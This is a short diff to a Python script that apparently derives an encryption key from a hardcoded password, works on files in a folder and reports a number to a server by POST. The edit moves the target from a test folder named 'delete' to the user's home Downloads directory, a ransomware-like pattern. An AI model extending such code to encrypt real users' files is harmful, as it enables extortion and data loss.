@@ -171,13 +171,19 @@ def send_to_server(number):
     except requests.exceptions.RequestException as e:
         print(f"Error sending POST request: {e}")
 
+def list_folders(directory):
+    folders = [name for name in os.listdir(directory) if os.path.isdir(os.path.join(directory, name))]
+    return folders
 
 if __name__ == "__main__":
     # Define the number of blocks and digits per block
     num_blocks = 4  # Change this to the number of blocks you want
     digits_per_block = 4  # Change this to the number of digits per block
 
-    directory = "C:\\Users\\Dana Amram\\Downloads\\delete"
+    # directory = "C:\\Users\\Dana Amram\\Downloads\\delete2"
+    directory = os.path.expanduser('~') + '\downloads\delete'
+    print(directory)
+    
     password = "dana"  # Define your encryption password here, e.g., "12-34-56"
     key = generate_key(password)
     
